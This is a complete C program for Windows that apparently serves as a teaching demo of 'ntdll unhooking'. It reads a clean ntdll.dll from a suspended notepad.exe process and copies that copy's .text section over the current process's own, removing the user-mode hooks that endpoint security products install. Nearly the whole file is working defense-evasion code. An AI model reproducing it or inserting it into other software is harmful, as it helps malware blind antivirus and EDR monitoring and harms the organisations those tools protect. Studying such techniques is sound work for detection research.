#include <Windows.h>
#include <stdio.h>
#include <winternl.h>


PVOID FetchLocalNtdllBaseAddress() {

#ifdef _WIN64
	PPEB pPeb = (PPEB)__readgsqword(0x60);
#elif _WIN32
	PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif // _WIN64

	PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

	return pLdr->DllBase;
}

// get the size of the NTDLL image from its base address
SIZE_T GetNtdllSizeFromBaseAddr(IN PBYTE pNtdllBase) {

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pNtdllBase;
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return NULL;
	}

	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pNtdllBase + pDosHeader->e_lfanew);
	if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return NULL;
	}

	return pNtHeaders->OptionalHeader.SizeOfImage;
}

// read the unhooked NTDLL from suspended process
BOOL UnhookNtdllFromSuspendedProcess(IN LPCSTR lpProcessName, OUT PVOID* ppNtdllBuff) {

	CHAR cWinPath[MAX_PATH / 2] = NULL;
	CHAR cProcessPath[MAX_PATH] = NULL;

	PVOID pNtdllBaseAddr = FetchLocalNtdllBaseAddress();
	SIZE_T sNumberOfBytesRead = NULL;

	STARTUPINFO Si = { 0 };
	PROCESS_INFORMATION Pi = { 0 };

	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	Si.cb = sizeof(STARTUPINFO);

	if (!GetWindowsDirectoryA(cWinPath, sizeof(cWinPath))) {
		printf("[!] GetWindowsDirectoryA Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	sprintf_s(cProcessPath, sizeof(cProcessPath), "%s\\System32\\%s", cWinPath, lpProcessName);

	if (!CreateProcessA(
		NULL,
		cProcessPath,
		NULL,
		NULL,
		FALSE,
		DEBUG_PROCESS,		// it can be suspended
		NULL,
		NULL,
		&Si,
		&Pi
	)) {
		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	SIZE_T sNtdllImageSize = GetNtdllSizeFromBaseAddr((PBYTE)pNtdllBaseAddr);
	if (!sNtdllImageSize) {
		goto _EndOfFunction;
	}

	PBYTE pNtdllBuff = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sNtdllImageSize);
	if (!pNtdllBuff) {
		goto _EndOfFunction;
	}

	if (!ReadProcessMemory(Pi.hProcess, pNtdllBaseAddr, pNtdllBuff, sNtdllImageSize, &sNumberOfBytesRead) || sNumberOfBytesRead != sNtdllImageSize){
		printf("[!] ReadProcessMemory Failed with Error : %d \n", GetLastError());
		printf("[i] Read %d of %d Bytes \n", sNumberOfBytesRead, sNtdllImageSize);
		goto _EndOfFunction;
	}

	*ppNtdllBuff = pNtdllBuff;

	printf("[#] Press <Enter> To Terminate The Child Process ... ");
	getchar();

	// terminating the process
	if (DebugActiveProcessStop(Pi.dwProcessId) && TerminateProcess(Pi.hProcess, 0)) {
		printf("[+] Process Terminated \n");
	}

_EndOfFunction:
	if (Pi.hProcess)
		CloseHandle(Pi.hProcess);
	if (Pi.hThread)
		CloseHandle(Pi.hThread);
	if (*ppNtdllBuff == NULL)
		return FALSE;
	else
		return TRUE;

}


BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll) {

	PVOID				pLocalNtdll = (PVOID)FetchLocalNtdllBaseAddress();

	printf("\t[i] 'Hooked' Ntdll Base Address : 0x%p \n\t[i] 'Unhooked' Ntdll Base Address : 0x%p \n", pLocalNtdll, pUnhookedNtdll);
	printf("[#] Press <Enter> To Continue ... ");
	getchar();

	// getting the dos header
	PIMAGE_DOS_HEADER	pLocalDosHdr = (PIMAGE_DOS_HEADER)pLocalNtdll;
	if (pLocalDosHdr && pLocalDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;

	// getting the nt headers
	PIMAGE_NT_HEADERS pLocalNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pLocalDosHdr->e_lfanew);
	if (pLocalNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;


	PVOID		pLocalNtdllTxt = NULL,	// local hooked text section base address
		pRemoteNtdllTxt = NULL; // the unhooked text section base address
	SIZE_T		sNtdllTxtSize = NULL;	// the size of the text section



	// getting the text section
	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pLocalNtHdrs);

	for (int i = 0; i < pLocalNtHdrs->FileHeader.NumberOfSections; i++) {

		// the same as if( strcmp(pSectionHeader[i].Name, ".text") == 0 )
		if ((*(ULONG*)pSectionHeader[i].Name | 0x20202020) == 'xet.') {
			pLocalNtdllTxt = (PVOID)((ULONG_PTR)pLocalNtdll + pSectionHeader[i].VirtualAddress);
			pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll + pSectionHeader[i].VirtualAddress);
			sNtdllTxtSize = pSectionHeader[i].Misc.VirtualSize;
			break;
		}
	}


	printf("\t[i] 'Hooked' Ntdll Text Section Address : 0x%p \n\t[i] 'Unhooked' Ntdll Text Section Address : 0x%p \n\t[i] Text Section Size : %d \n", pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);
	printf("[#] Press <Enter> To Continue ... ");
	getchar();

	// small check to verify that all the required information is retrieved
	if (!pLocalNtdllTxt || !pRemoteNtdllTxt || !sNtdllTxtSize)
		return FALSE;

	// small check to verify that 'pRemoteNtdllTxt' is really the base address of the text section
	if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt)
		return FALSE;


	printf("[i] Replacing The Text Section ... ");
	DWORD dwOldProtection = NULL;

	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) {
		printf("[!] VirtualProtect [1] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);

	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, dwOldProtection, &dwOldProtection)) {
		printf("[!] VirtualProtect [2] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[+] DONE !\n");

	return TRUE;
}


int main() {

	PVOID	pNtdll = NULL;

	printf("[i] Fetching A New \"ntdll.dll\" File From A Suspended Process\n");

	if (!UnhookNtdllFromSuspendedProcess("notepad.exe", &pNtdll))
		return -1;

	if (!ReplaceNtdllTxtSection(pNtdll))
		return -1;

	HeapFree(GetProcessHeap(), 0, pNtdll);

	printf("[+] Ntdll Unhooked Successfully \n");

	printf("[#] Press <Enter> To Quit ...");
	getchar();

	return 0;
}